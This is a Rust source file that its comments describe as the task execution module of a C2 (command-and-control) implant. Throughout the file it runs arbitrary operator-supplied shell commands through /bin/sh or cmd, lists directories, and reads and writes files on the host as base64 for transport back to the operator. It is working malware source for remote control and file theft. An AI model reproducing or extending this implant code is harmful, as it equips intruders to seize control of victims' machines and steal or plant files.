// exec.rs — task execution
//
// keeping this boring on purpose. the interesting part of a C2 isn't
// the command execution, it's the comms layer.
//
// shell(): spawns /bin/sh -c on unix, cmd /c on windows
// ls(): just reads a dir, formats it nicely
// read_file() / write_file(): base64 encoded for safe JSON transport

use base64::{engine::general_purpose::STANDARD as B64, Engine};
use std::process::Command;

pub struct ExecResult {
    pub output:    String,
    pub exit_code: Option<i32>,
    pub error:     Option<String>,
}

impl ExecResult {
    fn ok(output: String, code: i32) -> Self {
        ExecResult { output, exit_code: Some(code), error: None }
    }
    fn err(msg: String) -> Self {
        ExecResult { output: String::new(), exit_code: None, error: Some(msg) }
    }
}

pub async fn shell(cmd: &str) -> ExecResult {
    // tokio::process would be cleaner but i want this to work in
    // environments where async process spawn is problematic (some seccomp profiles)
    // blocking_in_place lets tokio's scheduler handle it without a dedicated thread pool
    let cmd = cmd.to_owned();
    tokio::task::spawn_blocking(move || run_shell(&cmd))
        .await
        .unwrap_or_else(|e| ExecResult::err(format!("spawn error: {e}")))
}

fn run_shell(cmd: &str) -> ExecResult {
    #[cfg(unix)]
    let output = Command::new("/bin/sh").args(["-c", cmd]).output();
    #[cfg(windows)]
    let output = Command::new("cmd").args(["/c", cmd]).output();

    match output {
        Ok(out) => {
            // combine stdout + stderr — operator wants to see both
            let mut combined = String::from_utf8_lossy(&out.stdout).to_string();
            let stderr = String::from_utf8_lossy(&out.stderr);
            if !stderr.is_empty() {
                combined.push_str(&format!("\n[stderr]\n{stderr}"));
            }
            ExecResult::ok(combined, out.status.code().unwrap_or(-1))
        }
        Err(e) => ExecResult::err(format!("exec failed: {e}")),
    }
}

pub fn ls(path: &str) -> ExecResult {
    let entries = match std::fs::read_dir(path) {
        Ok(e) => e,
        Err(e) => return ExecResult::err(format!("ls {path}: {e}")),
    };

    let mut lines = Vec::new();
    for entry in entries.flatten() {
        let meta = entry.metadata();
        let name = entry.file_name().to_string_lossy().to_string();
        let type_char = match meta {
            Ok(ref m) if m.is_dir()     => 'd',
            Ok(ref m) if m.is_symlink() => 'l',
            _                           => '-',
        };
        let size = meta.as_ref().map(|m| m.len()).unwrap_or(0);
        lines.push(format!("{type_char} {:>10}  {name}", size));
    }
    lines.sort();
    ExecResult::ok(lines.join("\n"), 0)
}

pub fn read_file(path: &str) -> ExecResult {
    match std::fs::read(path) {
        Ok(bytes) => ExecResult::ok(B64.encode(&bytes), 0),
        Err(e)    => ExecResult::err(format!("read {path}: {e}")),
    }
}

pub fn write_file(path: &str, data_b64: &str) -> ExecResult {
    let bytes = match B64.decode(data_b64) {
        Ok(b)  => b,
        Err(e) => return ExecResult::err(format!("base64 decode: {e}")),
    };
    match std::fs::write(path, &bytes) {
        Ok(_)  => ExecResult::ok(format!("wrote {} bytes to {path}", bytes.len()), 0),
        Err(e) => ExecResult::err(format!("write {path}: {e}")),
    }
}
// exec module
// execution functions for tasks
